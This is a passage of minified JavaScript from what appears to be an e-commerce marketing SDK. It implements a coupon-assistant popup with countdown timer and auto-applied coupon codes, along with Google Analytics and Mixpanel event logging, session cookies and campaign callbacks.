else if(spApi.displayNotes==4){sQuery('#sp-notes').hide();}
else{if(sQuery.trim(sQuery('.sp-coupon').text())==""){sQuery('#sp-notes').hide();}
else{var noteHeight=sQuery('#sp-notes').height();var titleHeight=sQuery('#sp-notes .sp-title').height()+10;var bottomAnimate=(noteHeight-titleHeight)*-1;var bottom=bottomAnimate;}}}
sQuery('.sp-noteClose').die('click').live('click',function(){sQuery('#sp-notes').fadeOut();setSessionOnlyCookie('couponAsistantShowed','1');if(JSON.parse(localStorage.getItem('couponAsistantLog'))==null){if(spApi.isOnCartPage())
ref=1;else
ref=document.location.href;spApi.worker.send('couponAssitantLog',{type:'closeCouponAssist',campId:'',referer:ref});localStorage.setItem('couponAsistantLog',JSON.stringify('1'));}});if(Boolean(spApi.couponAsistanceShowEvents)){sQuery.each(spApi.couponAsistanceShowEvents,function(key,callback){callback();});}
sQuery('.sp-noteMin, .sp-title').die('click').live('click',function(){if(spApi.displayNotes==3){sQuery.cookie('sp-notes',1+'|'+sQuery.toJSON(notes),{expires:notesDate,path:'/',domain:cookieDomain});var noteHeight=sQuery('#sp-notes').height();var titleHeight=sQuery('#sp-notes .sp-title').height()+10;var bottomAnimate=(noteHeight-titleHeight)*-1;sQuery('#sp-notes').animate({bottom:bottomAnimate+"px"},400);spApi.displayNotes=1;}
else{sQuery.cookie('sp-notes',3+'|'+sQuery.toJSON(notes),{expires:notesDate,path:'/',domain:cookieDomain});sQuery('#sp-notes').animate({bottom:"0"},400);spApi.displayNotes=3;}});var browser=spApi.getBrowser();if(browser!="Safari"&&browser!="Firefox"){sQuery.ajaxSetup({cache:true});var pluginSrc=spApi.apiUrl+'js/jquery.zclip-light.min.js';if(!('ZeroClipboard'in window)){pluginSrc=spApi.apiUrl+'js/jquery.zclip.min.js';}
sQuery.getScript(pluginSrc).done(function(){try{sQuery('.sp-copy').show();sQuery('.sp-copy').zclip({path:spApi.apiUrl+'js/ZeroClipboard.swf',copy:function(){return sQuery('.sp-coupon').text();},afterCopy:function(){sQuery('.sp-notes-pop').show();if(spApi.isOnCartPage()){ref=1;}else{ref=document.location.href;}
spApi.worker.send('couponAssitantLog',{type:'copyCoupon',campId:'',referer:ref});}});sQuery('.sp-copy').css("visibility","visible");}catch(err){spApi.errLog(err,{logType:'ZeroClipBoard Version Conflict Error',bugType:'product'});}});sQuery.ajaxSetup({cache:false});}
var hasFlash=false;try{var fo=new ActiveXObject('ShockwaveFlash.ShockwaveFlash');if(fo){hasFlash=true;}}
catch(e){if(navigator.mimeTypes&&navigator.mimeTypes['application/x-shockwave-flash']!=undefined&&navigator.mimeTypes['application/x-shockwave-flash'].enabledPlugin){hasFlash=true;}}
if(hasFlash==false){sQuery('.sp-copy').remove();sQuery('.zclip').remove();}
sQuery('.sp-notes-pop-close').click(function(){sQuery(this).parent(0).hide();});});}}catch(err){spApi.errLog(err);}
window.spInit=1;}},noteTimer:function(data){var noteCookie=function(){return JSON.parse(sQuery.cookie('sp-noteTimer'));};var getNoteCookie=function(key){var cookieData=noteCookie();if(cookieData!=undefined&&cookieData[key]!=undefined){return cookieData[key];}
else{return undefined;}};var updateNoteCookie=function(key,value){var cookieData=noteCookie();if(key=="display"&&value=="closed"){sQuery.cookie('spNTStatus',"true",{path:'/',domain:cookieDomain});}
else if(cookieData!=undefined&&cookieData[key]!=undefined){cookieData[key]=value;sQuery.cookie('sp-noteTimer',JSON.stringify(cookieData),{expires:new Date(cookieData.expireDate),path:'/',domain:cookieDomain});}};var isClosed=function(){return sQuery.cookie('spNTStatus')=="true";};var deleteNoteCookies=function(){sQuery.cookie('sp-noteTimer',null,{expires:1,path:'/',domain:cookieDomain});sQuery.cookie('spNTStatus',null,{expires:1,path:'/',domain:cookieDomain});};var isUpgraded=function(){return typeof noteSettings.upgraded!=='undefined'&&noteSettings.upgraded===true;};var hexToRgb=function(hex){var bigint=parseInt(hex,16);var r=(bigint>>16)&255;var g=(bigint>>8)&255;var b=bigint&255;return r+","+g+","+b;};if(sQuery.cookie('sp-noteTimer')==undefined&&data==undefined){return false;}
var redirectUrl='';if(data!=undefined&&typeof data.redirectUrl!="undefined"){redirectUrl=data.redirectUrl;}
if(sQuery.cookie('sp-noteTimer')==undefined&&data!=undefined){var cId=data.cId;var couponCode=data.couponCode;var noteSettings=this.notifies[cId].noteSettings;var expireMinute=parseInt(noteSettings.couponExpireDate1)*60+parseInt(noteSettings.couponExpireDate2);var startDate=new Date().getTime();var expireDate=startDate+(expireMinute*60000);if(isUpgraded()&&!noteSettings.showTimer){expireDate=noteSettings.couponExpDate*1000;}
var timerData={'startDate':startDate,'expireDate':expireDate,'cId':cId,'code':spApi.Base64.encode(couponCode),'encoded':'true','display':'opening','couponApply':'false'};sQuery.cookie('sp-noteTimer',JSON.stringify(timerData),{expires:new Date(expireDate),path:'/',domain:cookieDomain});}
else{var cId=getNoteCookie('cId');var couponCode=getNoteCookie('code');if(getNoteCookie('encoded')=='true'){couponCode=spApi.Base64.decode(couponCode);}
var noteSettings=this.notifies[cId].noteSettings;}
if(isClosed()){return false;}
if(sQuery('#sp-notes').length>0||sQuery('#ins-coupon-assist').length>0){return false;}
var validDate=noteSettings.couponExpDate;if(isUpgraded()&&!noteSettings.showTimer&&spApi.getUTCTime()>validDate){deleteNoteCookies();return false;}
var spLang="en";if(spApi.getLang()=="tr_TR"){spLang="tr";}else if(spApi.getLang()=="ru_RU"){spLang="ru";}else if(spApi.getLang()=="pl_PL"){spLang="pl";}
var lang={};lang["en"]={};lang["en"]["coupAssitCode"]="Your Coupon";lang["en"]["dayText"]="day(s)";lang["en"]["copied"]="Copied";lang["tr"]={};lang["tr"]["coupAssitCode"]="Kupon Kodunuz";lang["tr"]["dayText"]="gn";lang["tr"]["copied"]="Kopyaland";lang["ru"]={};lang["ru"]["coupAssitCode"]="&#1050;&#1086;&#1076; &#1050;&#1091;&#1087;&#1086;&#1085;&#1072;";lang["ru"]["dayText"]="&#1076;&#1077;&#1085;&#1100;";lang["ru"]["copied"]="&#1057;&#1082;&#1086;&#1087;&#1080;&#1088;&#1086;&#1074;&#1072;&#1085;";lang["pl"]={};lang["pl"]["coupAssitCode"]="Twj kupon";lang["pl"]["dayText"]="godzin";lang["pl"]["copied"]="Skopiowany";if(typeof noteSettings.ntWarningBackground=="undefined"){noteSettings.ntWarningBackground='da0000';}
if(typeof noteSettings.ntWarningText=="undefined"){noteSettings.ntWarningText='4adc00';}
if(typeof noteSettings.ntNotWarningBackground=="undefined"){noteSettings.ntNotWarningBackground='da0000';}
if(typeof noteSettings.ntNotWarningText=="undefined"){noteSettings.ntNotWarningText='4adc00';}
if(typeof noteSettings.couponTimerRuleId=="undefined"){noteSettings.couponTimerRuleId=0;}
noteSettings.couponTimerRuleId=parseInt(noteSettings.couponTimerRuleId);var assistConf={'noteElem':'#sp-notes','closeElem':'.sp-noteClose','titleElem':'.sp-title','toggleElem':'.sp-noteMin, .sp-title','timerElem':'.sp-coupon','html':'<div id="sp-notes"> <div class="sp-notes-pop"> <a href="javascript:void(0);" class="sp-notes-pop-close"></a><strong id="coupAssitCopyMsg"></strong><br> <div id="coupAssitCopyMsgBody"></div> </div> <div class="sp-title">'+lang[spLang]["coupAssitCode"]+'</div> <a href="javascript:;" class="sp-noteMin"></a><a href="javascript:;" class="sp-noteClose"></a> <div class="sp-couponHolder"> <div class="sp-coupon" style="padding: 7px; font-size: 24px;"></div> </div> <div class="sp-note">'+this.getCamp(cId).camp.showNotes.replace(/(\r\n|\n\r|\r|\n)/g,"<br>")+'</div> <div class="product-footer"> <div class="marka-logo"><img src="//klook.img.sociaplus.com/" /></div> <div class="socia-logo"><img src="'+spApi.apiUrl+'images/pw_65x13.png" /></div> </div> </div>'};if(isUpgraded()){assistConf={'noteElem':'#ins-coupon-assist','closeElem':'#ins-assist-close','titleElem':'#ins-assist-title','toggleElem':'#ins-assist-title-cont','timerElem':'#ins-assist-timer','couponElem':'#ins-assist-coupon','copyElem':'#ins-assist-copy','html':'<div id="ins-coupon-assist"><div id="ins-assist-title-cont"><div id="ins-assist-title"></div><div id="ins-assist-toggle" class="ins-assist-maximize"></div></div><div id="ins-assist-container"><div id="ins-assist-timer"></div><div id="ins-assist-desc"></div><div id="ins-assist-coupon">'+couponCode+'</div><div id="ins-assist-copy" data-clipboard-target="#ins-assist-coupon"></div><div id="ins-assist-close"><a></a></div></div></div>'};}
var togglePosition='bottom';var notificationHTML='<div class="sp-timer-notification" style="bottom: 15px; right: 15px; width:200px; min-height:47px; background: rgba('+hexToRgb(noteSettings.ntWarningBackground)+', 0.5); position:fixed; z-index:99999999999; border-radius:5px; display:none;"> <div style="width:154px; min-height:18px; overflow:hidden; margin:5px; float:left; padding:10px 18px; font-family:Calibri; color: #'+noteSettings.ntWarningText+'; font-size:12px; line-height:normal; text-align:left; outline:none;">'+noteSettings.couponTimerWarningText+'</div> <div class="sp-inner-notification-close" onclick="sQuery(this).closest(\'.sp-timer-notification\').remove();" style="color:#555; background:url(//api.sociaplus.com/images/close-notif-white.png) no-repeat; background-size:10px; position:absolute; top:8px; right:8px; cursor:pointer; width:10px; height:10px;"></div> </div>';var notificationNotAppliedHTML='<div class="sp-timer-notification" style="bottom: 15px; right: 15px; width:200px; min-height:47px; background: rgba('+hexToRgb(noteSettings.ntNotWarningBackground)+', 0.5); position:fixed; z-index:99999999999; border-radius:5px; display:none;"> <div style="width:154px; min-height:18px; overflow:hidden; margin:5px; float:left; padding:10px 18px; font-family:Calibri; color: #'+noteSettings.ntNotWarningText+'; font-size:12px; line-height:normal; text-align:left; outline:none;">'+noteSettings.couponTimerNotAppliedText+'</div> <div class="sp-inner-notification-close" onclick="sQuery(this).closest(\'.sp-timer-notification\').remove();" style="color:#555; background:url(//api.sociaplus.com/images/close-notif-white.png) no-repeat; background-size:10px; position:absolute; top:8px; right:8px; cursor:pointer; width:10px; height:10px;"></div> </div>';var calculateMinPosition=function(){return-(sQuery('#ins-assist-container').outerHeight()+parseFloat(sQuery('#ins-coupon-assist').css('border-top-width')));};var toggleIcon=function(status){if(isUpgraded()){sQuery(assistConf.noteElem).find('#ins-assist-toggle').removeClass('ins-assist-maximize ins-assist-minimize').addClass('ins-assist-'+status);}};var checkOptionals=function(){var assistElem=sQuery(assistConf.noteElem);if(!noteSettings.showCoupon){assistElem.find(assistConf.couponElem).remove();assistElem.find(assistConf.copyElem).remove();}
if(!noteSettings.showTimer)
assistElem.find(assistConf.timerElem).remove();};var setPosition=function(){var assistElem=sQuery(assistConf.noteElem);if(noteSettings.mobilePosition=='top'&&spApi.isMobileBrowser()&&(sQuery(window).outerWidth()<=480||sQuery(window).outerHeight()<=480)){sQuery(assistConf.noteElem).append(sQuery(assistConf.toggleElem)).addClass('ins-assist-mobile-top');togglePosition='top';}
else{var positionConf={'bottom-left':'ins-assist-position-left','bottom-center':'ins-assist-position-center','bottom-right':'ins-assist-position-right'};assistElem.addClass(positionConf[noteSettings.webPosition]);}};var setAssistColor=function(){var assistElem=sQuery(assistConf.noteElem);var color=noteSettings.assistColor;assistElem.css('border-color',color);assistElem.find(assistConf.toggleElem).css('background-color',color);assistElem.find(assistConf.timerElem).css('color',color);assistElem.find(assistConf.couponElem).css('border-color',color);assistElem.find(assistConf.copyElem).css('background-color',color);};var setCopyButton=function(){var clipboard=new InsClipboard(assistConf.copyElem);clipboard.on('success',function(e){sQuery(assistConf.copyElem).html(lang[spLang]["copied"]).css('background-color','#1bc15d');e.clearSelection();});};var getAnimateObj=function(pos){var animObj={};animObj[togglePosition]=pos;return animObj;};var setTexts=function(){var texts=noteSettings.assistTexts;sQuery(assistConf.noteElem).find('#ins-assist-title').text(texts.title);sQuery(assistConf.noteElem).find('#ins-assist-desc').text(texts.desc);sQuery(assistConf.noteElem).find('#ins-assist-copy').text(texts.copy);sQuery(assistConf.noteElem).find('#ins-assist-close a').text(texts.close);};var openNote=function(){if(redirectUrl.length>0&&redirectUrl!="#"&&redirectUrl.indexOf('javascript:void')===-1){window.location.href=redirectUrl;return false;}
spApi.logger('info','Geri saym kupon asistan aktif',cId);var displayStatus=getNoteCookie('display');sQuery('body').append(assistConf.html);var assistElem=sQuery(assistConf.noteElem);if(isUpgraded()){setTexts();setAssistColor();checkOptionals();setPosition();if(noteSettings.showCoupon){spApi.loadScript(spApi.staticUrl+'js/clipboard.min.js',setCopyButton);}
var minPos=calculateMinPosition();assistElem.css(togglePosition,minPos);}
if(displayStatus=='opening'){setTimeout(function(){assistElem.animate(getAnimateObj('0'),1200);toggleIcon('minimize');},1000);updateNoteCookie('display','opened');}
else if(displayStatus=='opened'){assistElem.css(togglePosition,'0');toggleIcon('minimize');}
else if(displayStatus=='minimize'){var expireDate=getNoteCookie('expireDate');if(!isUpgraded()||noteSettings.showTimer)
sQuery(assistConf.titleElem).countdown({until:new Date(expireDate),format:'dhMS',layout:'{d<}{dn} '+lang[spLang]["dayText"]+' {d>}{h<}{hn}{sep}{h>}{m<}{mnn}{sep}{m>}{s<}{snn}{s>}'});toggleIcon('maximize');}};var toggleNote=function(){var displayStatus=getNoteCookie('display');var assistElem=sQuery(assistConf.noteElem);if(displayStatus=='opened'){var minPos=calculateMinPosition();assistElem.animate(getAnimateObj(minPos),400);toggleIcon('maximize');updateNoteCookie('display','minimize');if(noteSettings.showTimer){var expireDate=getNoteCookie('expireDate');sQuery(assistConf.titleElem).countdown({until:new Date(expireDate),format:'dhMS',layout:'{d<}{dn} '+lang[spLang]["dayText"]+' {d>}{h<}{hn}{sep}{h>}{m<}{mnn}{sep}{m>}{s<}{snn}{s>}'})}}
else{assistElem.animate(getAnimateObj('0'),400);toggleIcon('minimize');updateNoteCookie('display','opened');sQuery(assistConf.titleElem).countdown('destroy').html(noteSettings.assistTexts.title);}};var minNote=function(){var displayStatus=getNoteCookie('display');var noteHeight=sQuery('#sp-notes').height();var titleHeight=sQuery('#sp-notes .sp-title').height()+10;var bottomAnimate=(noteHeight-titleHeight)*-1;if(displayStatus=='opened'){sQuery('#sp-notes').animate({bottom:bottomAnimate+'px'},400);updateNoteCookie('display','minimize');var expireDate=getNoteCookie('expireDate');sQuery('.sp-title').countdown({until:new Date(expireDate),format:'dhMS',layout:'{d<}{dn} '+lang[spLang]["dayText"]+' {d>}{h<}{hn}{sep}{h>}{m<}{mnn}{sep}{m>}{s<}{snn}{s>}'});}
else{sQuery('#sp-notes').animate({bottom:"0"},400);updateNoteCookie('display','opened');sQuery('.sp-title').countdown('destroy').html(lang[spLang]["coupAssitCode"]);}};var closeNote=function(){sQuery(assistConf.noteElem).fadeOut();updateNoteCookie('display','closed');sQuery(assistConf.timerElem).countdown('destroy');sQuery(assistConf.titleElem).countdown('destroy');sQuery(assistConf.noteElem).remove();clearInterval(flashInterval);};var flashInterval=undefined;var flashEffect=function(){var endDate=getNoteCookie('expireDate');flashInterval=setInterval(function(){var remainingMin=(new Date(endDate).getTime()-new Date().getTime())/60000;if(remainingMin<=noteSettings.couponTimerWarningTime){sQuery(assistConf.timerElem).effect(noteSettings.couponTimerWarningEffect);}},2000);};var applyCoupon=function(){setTimeout(function(){var applyButtonClick=spApi.useCouponButton().buttonClick;var couponInput=spApi.useCouponButton().couponInput;var applyStatus=getNoteCookie('couponApply');if(applyStatus=='false'){if(typeof noteSettings.couponTimerRuleId!="undefined"&&noteSettings.couponTimerRuleId>0&&!spApi.e(spApi.rules[noteSettings.couponTimerRuleId].test)){return false;}
spApi.logger('info','Geri saym kuponu uygulanyor.',cId);updateNoteCookie('couponApply','applying');if(sQuery(couponInput).length>0){var inputColor=sQuery(couponInput).css('background-color');var defaultColor=sQuery(couponInput).css('color');sQuery(couponInput).css('color',inputColor).val(couponCode);spApi.e(applyButtonClick);setTimeout(function(){sQuery(couponInput).css('color',defaultColor);},3000);}}
else if(applyStatus=='applying'){if(spApi.isCouponCodeApplied()){var startDate=getNoteCookie('startDate');var elapsedTime=Math.round((new Date().getTime()-new Date(startDate).getTime())/60000);if(elapsedTime<1){elapsedTime=1;}
spApi.worker.send('do-logging',{type:'couponAppliedTimer',campId:cId,referer:window.location.href,otherProperties:{'couponCode':couponCode,'elapsedTime':elapsedTime}});closeNote();if(noteSettings.couponTimerWarningText!=undefined&&noteSettings.couponTimerWarningText.length>0){sQuery('body').append(notificationHTML);sQuery('.sp-timer-notification').fadeIn().fadeOut(10000);}
updateNoteCookie('couponApply','applied');}
else{closeNote();if(noteSettings.couponTimerNotAppliedText!=undefined&&noteSettings.couponTimerNotAppliedText.length>0){sQuery('body').append(notificationNotAppliedHTML);sQuery('.sp-timer-notification').fadeIn().fadeOut(10000);}}}},2000)};sQuery(assistConf.toggleElem).die('click').live('click',function(){if(isUpgraded())
toggleNote();else
minNote();});sQuery(assistConf.closeElem).die('click').live('click',function(){closeNote();spApi.worker.send('do-logging',{type:'closedCouponTimer',campId:cId,referer:window.location.href});});var startTimer=function(){if(sQuery('#sp-notes').length>0||sQuery('#ins-coupon-assist').length>0){return false;}
openNote();if(!isUpgraded()||noteSettings.showTimer){var expireDate=getNoteCookie('expireDate');sQuery(assistConf.timerElem).countdown({onExpiry:function(){closeNote();},until:new Date(expireDate),format:'dhMS',layout:'{d<}{dn} '+lang[spLang]["dayText"]+' {d>}{h<}{hn}{sep}{h>}{m<}{mnn}{sep}{m>}{s<}{snn}{s>}'});}
if(noteSettings.couponTimerWarningEffect!='-1'){flashEffect();}
if(spApi.isOnCouponPage()){applyCoupon();}};if(isUpgraded()){var link=document.createElement('link');link.setAttribute('id','ins-assist-css');link.setAttribute('rel','stylesheet');link.setAttribute('type','text/css');link.setAttribute('media','screen');link.addEventListener('load',startTimer,false);document.getElementsByTagName('head')[0].appendChild(link);link.setAttribute('href',spApi.staticUrl+'css/coupon-assist.css');}
else{startTimer();}
if(Boolean(spApi.couponAsistanceShowEvents)){sQuery.each(spApi.couponAsistanceShowEvents,function(key,callback){callback();});}},gaSend:function(l,caller){try{if(this.gaServiceIsActive=='0'){return false;}
if(!l.campId==undefined){return false;}
l.campId=l.campId.toString();var campID=0;var campName='';var gaCamp={};var gaEvents=caller==='versus'?spApi.widgets.versus.gaConfig:{};var dataSending=false;var productType=0;function mixPanelSender(action,campId){try{if(typeof mixpanel==='object'&&typeof mixpanel.track==='function'){unregisterProperties(campId)
mixpanel.register(formMixPanelData(action,campId));mixpanel.track('INSIDER');spApi.logger('info','Sending '+action+' log to mixpanel',campId);spApi.logger('info','Mixpanel data '+JSON.stringify(formMixPanelData(action,campId))+' have sent',campId);}}catch(e){spApi.logger('info','mixpanel not defined, '+action+' log could not send',campId);}}
function unregisterProperties(campId){var persistance=mixpanel.persistence;if(typeof persistance==='object'&&typeof persistance.props==='object'){for(var prop in persistance.props){if(prop.indexOf('Insider')>-1){mixpanel.unregister(prop);spApi.logger('info','Unregistering '+prop+' from superproperties',campId);}}}}
function formMixPanelData(action,campId){var mixPanelData={};var campInformation=action;mixPanelData['Insider-'+spApi.getBuilderIdFromVar(campId)]=action
return mixPanelData;}
if(l.campId.indexOf('c')>-1||l.productType=='custom'){if(l.campId.indexOf('c')<0){l.campId='c'+l.campId}
var cCamps=this.customizationCamps;sQuery.each(cCamps,function(i,c){if(l.campId==c.id){campID=c.id;campName=spApi.decryptCampName(c.campName);gaCamp=c;gaEvents=c.gaEvents||{};}});}
else{var cCamps=this.camps;sQuery.each(cCamps,function(i,c){if(l.campId==c.id){campID=c.id;campName=spApi.decryptCampName(c.campName);productType=c.productType;gaCamp=c;gaEvents=c.gaEvents||{};}});}
var logType=l.logType||l.type||l.salesType;function setVersusCampName(){var campName='versus';if(spApi.widgets.versus.expreimentAndTesting.isControlGroup()){return campName+' - Control Group'}
return campName;}
var eventCategory='INSIDER';var eventAction=caller==='versus'?setVersusCampName():campName;var eventLabel='';var eventValue=0;if(this.gaNonInteraction=='1'){var nonInteraction=true;}
else{var nonInteraction=false;}
if(logType=='impression'||logType=='camp-step1'){if(gaEvents['impression']!='1'&&gaEvents['impression']!='true'){return false;}
eventAction+='-impressions';dataSending=true;}
else if(logType=='camp-join'||logType=='join'){if(gaEvents['join']!='1'&&gaEvents['click']!='true'){return false;}
eventAction+='-joins';if(typeof l.extra!=="undefined"&&typeof l.extra.joinText!=="undefined"&&l.extra.joinText!==""){eventAction+=' - '+l.extra.joinText;}
dataSending=true;}
else if(logType=='closed'||logType=='camp-step1-close'){if(gaEvents['close']!='1'){return false;}
eventAction+='-close';dataSending=true;}
else if(logType=='variation-sales'){if(gaEvents["sales"]!='1'&&gaEvents['sale']!='true'){return false;}
var orderId=this.getOrderId()||'NaN';var amount=sQuery.cookie('total-cart-amount')||0;eventAction+='-sales';eventLabel=orderId;eventValue=amount;dataSending=true;}
else if(logType=='sales'||logType=='bounce-sales'){if(gaEvents["sales"]!='1'){return false;}
var orderId=this.getOrderId()||'NaN';var amount=sQuery.cookie('total-cart-amount')||0;eventAction+='-sales';eventLabel=orderId;eventValue=amount;dataSending=true;}
else if(logType=='goal'){var goalKey="goal-"+l.goalId;if(gaEvents[goalKey]==undefined&&gaEvents[goalKey]!='1'){return false;}
var goalName=spApi.personalizationCamps[l.builderId]['goalBuilderList'][l.goalId]['goalName'];eventAction+='-'+goalName;dataSending=true;}
else if(logType=='globalExperiment'){eventAction=l.action;eventLabel=1;dataSending=true;}
else if(logType=='sendAdAudience'){dataSending=true;}
else if(logType=='experimentProofEvent'){dataSending=true;eventLabel=campName;}
else if(logType=='controlProofEvent'){dataSending=true;eventLabel='roi test control';}
eventValue=String(eventValue).replace(',','.');eventValue=Math.round(eventValue)||0;if(this.gaIsActiveCustom=='1'){if(window._gaq){_gaq.push(['_setCustomVar',this.gaCustomVar,'Insider',campID,2]);}}
if(dataSending==false){if(this.gaIsActiveCustom=='1'){if(window._gaq){_gaq.push(['_trackEvent',eventCategory,eventAction,'customVarEvent',eventValue,nonInteraction]);}}
return false;}
if(eventLabel==''){var builderId=spApi.getBuilderIdFromVar(campID);if(builderId!==false){eventLabel='(builder ID: '+builderId+')';}}
mixPanelSender(eventAction,campID);if(spApi.gaDataLayerIsActive=='1'){if(spApi.gaDataLayerSettings['eventName']==""){return false;}
if(spApi.gaDataLayerSettings['eventCategory']==""){return false;}
if(spApi.gaDataLayerSettings['eventAction']==""){return false;}
dataLayerObject={event:spApi.gaDataLayerSettings['eventName']};dataLayerObject[spApi.gaDataLayerSettings['eventCategory']]=eventCategory;dataLayerObject[spApi.gaDataLayerSettings['eventAction']]=eventAction;if(spApi.gaDataLayerSettings['eventLabel']!=""){dataLayerObject[spApi.gaDataLayerSettings['eventLabel']]=eventLabel;}
if(spApi.gaDataLayerSettings['eventValue']!=""){dataLayerObject[spApi.gaDataLayerSettings['eventValue']]=eventValue;}
window.dataLayer=window.dataLayer||[];dataLayer.push(dataLayerObject);spApi.logger('info','dataLayer ile analytics logu atld.',campID);return true;}
var sameTracking=false;try{if(window.ga&&window._gaq&&typeof ga.getAll!="undefined"&&typeof _gat!="undefined"&&ga.getAll()[0].get('trackingId')==_gat._getTrackerByName()._getAccount()){sameTracking=true;}}catch(e){}
function gaSender(tracker,gaType){if(typeof tracker!=='string'){return;}
gaType=gaType||'ga';var gaData={'hitType':'event','eventCategory':eventCategory,'eventAction':eventAction,'eventLabel':eventLabel,'eventValue':eventValue,'nonInteraction':nonInteraction};var sendDebugLogsFor=function(type,success){if(typeof success==='boolean'){var debugText=type+(success?' objesiyle analytics logu atld.':' is not defined, we did not push to ga.');spApi.logger('info',debugText,campID);}}
if(gaType==='ga'&&typeof window.ga!=='undefined'){sendDebugLogsFor(gaType,true);return window.ga(tracker,gaData);}
if(gaType==='gua'&&typeof window.gua!=='undefined'){sendDebugLogsFor(gaType,true);return window.gua(tracker,gaData);}
return sendDebugLogsFor(gaType,false);}
if(window.ga){gaSender('send');}
if(window._gaq&&sameTracking==false){spApi.logger('info','_gaq objesiyle analytics logu atld.',campID);_gaq.push(['_trackEvent',eventCategory,eventAction,eventLabel,eventValue,nonInteraction]);}}catch(err){spApi.errLog(err);}},getGAStyleSesId:function(){var id=sQuery.cookie('ins-gaSSId');try{spApi.logger('info','set gaStyleSession id ');var sessionInit=false;var expDate=new Date();expDate.setTime(expDate.getTime()+(30*60*1000));var cookieSettings={expires:expDate,path:'/',domain:cookieDomain};var isSessionExpired=!id;if(!isSessionExpired){var oldSession=/.+_(.*)/.exec(id);if(oldSession&&oldSession.length==2){isSessionExpired=(new Date((oldSession[1]-3600)*1000)).getUTCDate()!=(new Date()).getUTCDate();}}
if(isSessionExpired){spApi.logger('info','update gaStyleSession id !');sessionInit=true;function guid(){function s4(){return Math.floor((1+Math.random())*0x10000).toString(16).substring(1);}
return s4()+s4()+'-'+s4()+'-'+s4()+'-'+
s4()+'-'+s4()+s4()+s4();}
id=guid()+'_'+spApi.getTime();var pairs=spApi.allStorageData();sQuery.each(pairs,function(i,obj){var key=obj.key;if(key.indexOf("ins-insight-")!=-1){var logData={key:sQuery.trim(key),obj:sQuery.toJSON(null)};spApi.updateCookie(logData,'nolog');}});}
if(typeof spApi.sessionInit==='undefined'){spApi.sessionInit=sessionInit;}
sQuery.cookie('ins-gaSSId',id,cookieSettings);}catch(err){spApi.errLog(err,{logType:'getGAStyleSesId',bugType:'partner'});}
return id;},cartCatCount:function(_cat){try{if(!spApi.isOnCartPage())return;var success=false;var count=0;var products=spApi.getPaidProducts()||[];var prodCats=JSON.parse(spApi.storageData('prodCats'))||[];if(typeof products=="undefined"||typeof prodCats=="undefined"||products.length==0||prodCats.length==0)return count;sQuery.each(products,function(i,product){success=false;sQuery.each(prodCats,function(j,cat){if(sQuery.trim(decodeURIComponent(cat.name))==sQuery.trim(product.name)&&cat.cat.toLowerCase().indexOf(_cat.toLowerCase())!=-1){success=true;return false;}});if(success)count++;});return count;}catch(err){spApi.errLog(err,{logType:'cartCatCount',bugType:'partner',extraData:{param1:_cat}});}},events:{camp:null,checkEventDuplicate:function(callback,type){var check=false;if(typeof callback!="undefined"&&typeof this.camp!="undefined"){check=true;var eventCallbacks=this.camp.callbacks[type];sQuery.each(eventCallbacks,function(i,func){if(typeof func==='function'&&typeof callback==='function'&&func.toString()==callback.toString()){check=false;}});}
return check;},setCamp:function(campId){var _camp=null;sQuery.each(spApi.camps,function(key,camp){if(camp.id==campId){_camp=camp;}});return _camp;},show:function(callback){if(this.checkEventDuplicate(callback,'show'))
this.setCamp(this.camp.id).callbacks.show.push(callback);return this;},load:function(callback){if(this.checkEventDuplicate(callback,'load'))
this.setCamp(this.camp.id).callbacks.load.push(callback);return this;},liked:function(callback){if(this.checkEventDuplicate(callback,'liked'))
this.setCamp(this.camp.id).callbacks.liked.push(callback);return this;},close:function(callback){if(this.checkEventDuplicate(callback,'close'))
this.setCamp(this.camp.id).callbacks.close.push(callback);return this;},setPosition:function(options){if(typeof options!="undefined"&&typeof this.camp!="undefined")
this.setCamp(this.camp.id).position=options;return this;},setData:function(params){}},getCamp:function(campId){if(typeof this.sortCamp=="undefined"){this.sortCamp={};var me=this;sQuery.each(spApi.camps.concat(spApi.customizationCamps),function(key,camp){me.sortCamp[camp.id]=camp;});}
spApi.events.camp=this.sortCamp[campId];return spApi.events;},setApiInitConditions:function(data){try{sQuery(data).each(function(index,eventList){sQuery.each(eventList,function(type,eventData){if(type=="standard"){var actions=['click','keydown','keyup'];if(actions.indexOf(eventData.event)>-1&&typeof window.apiInitEvent==='undefined'){sQuery(eventData.selectorString).live(eventData.event,function(e){setTimeout(function(){if(spApi.e(eventData.condition)){spApi.reInitOnChange();}},eventData.timeout||500);window.apiInitEvent=true;});}}else if(type=="urlChange"){var url=location.href;var urlTimer=setInterval(function(){if(location.href!=url){url=location.href;spApi.reInitOnChange();}},500);}});});}catch(err){spApi.errLog(err,{logType:'setApiInitConditions',bugType:'partner',extraData:{paramer:''}});}},reInitOnChangeCallbacks:[],reInitOnChange:function(){try{spApi.reInitOnChangeCallbacks.forEach(function(callback){callback()});sQuery('#spEvent').remove();if(sQuery.fancybox){var sliderCampList=[];var pairs=spApi.allStorageData();sQuery.each(pairs,function(i,obj){var key=obj.key;var value=unescape(obj.value);if(key.indexOf('sp-camp-')==-1)return;if(typeof spApi.notifies[key.match(/\d+/g)[0]]=="undefined")return;if(spApi.notifies[key.match(/\d+/g)[0]].category!="7")return;if(value.indexOf('hideSlider')!=-1)return;sliderCampList.push(key.match(/\d+/g)[0]);});sQuery.fancybox.close();sQuery('.sp-inner-notification').remove();sQuery('.sp-inline-wrap').remove();sQuery('.ins-crowdy-wrap').remove();sQuery('.ins-preview-wrapper').remove();sQuery.each(sliderCampList,function(key,campId){var campCookie=JSON.parse(spApi.storageData('sp-camp-'+campId));if(campCookie!=null){delete campCookie.hideSlider;spApi.storageData('sp-camp-'+campId,JSON.stringify(campCookie),{expires:14,path:'/',domain:cookieDomain});}});}
spApi.conLog('init');spApi.clearCustomCamps();spApi.personalizationSetStatus=false;spApi.sessionInit=undefined;spApi.init(false);}catch(err){spApi.errLog(err,{logType:'reinitOnParameterChange',bugType:'partner',extraData:{paramer:location.href}});}},isTargetingReady:function(camp){var builderId=spApi.getBuilderIdFromVar(camp.id);return camp.isTest!=1||(camp.isTest==1&&builderId in spApi.getCampBuilderCandidates());},getPersonalizationCamp:function(){if(!spApi.personalizationSetStatus){spApi.personalizationSetStatus=true;}else{return;}
spApi.userSegments=spApi.storageData("user-segments")==null?{}:sQuery.parseJSON(spApi.storageData("user-segments"));var newSegmentList=new Object();sQuery.each(spApi.personalizationCamps,function(prsnlztnId,prsnlztn){if(typeof prsnlztn=='undefined'){return;}
